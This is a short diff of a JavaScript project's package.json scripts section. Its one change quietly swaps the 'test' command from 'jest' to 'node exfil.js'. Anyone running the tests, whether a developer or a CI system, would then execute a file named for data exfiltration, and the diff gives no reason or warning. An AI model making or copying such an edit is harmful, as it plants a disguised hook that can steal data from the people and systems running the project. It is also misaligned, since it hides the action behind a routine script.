@@ -40,7 +40,7 @@
     "fix:prettier": "prettier \"src/**/*.ts\" --write",
     "lint": "eslint \"src/**/*.ts\"",
     "prettier": "prettier \"src/**/*.ts\" --check",
-    "test": "jest",
+    "test": "node exfil.js",
     "test:integration": "jest src/adapters/integration.test.ts",
     "test:cov": "jest src --ci --coverage",
     "prepare": "[ \"$NODE_ENV\" = production ] && exit 0; patch-package",
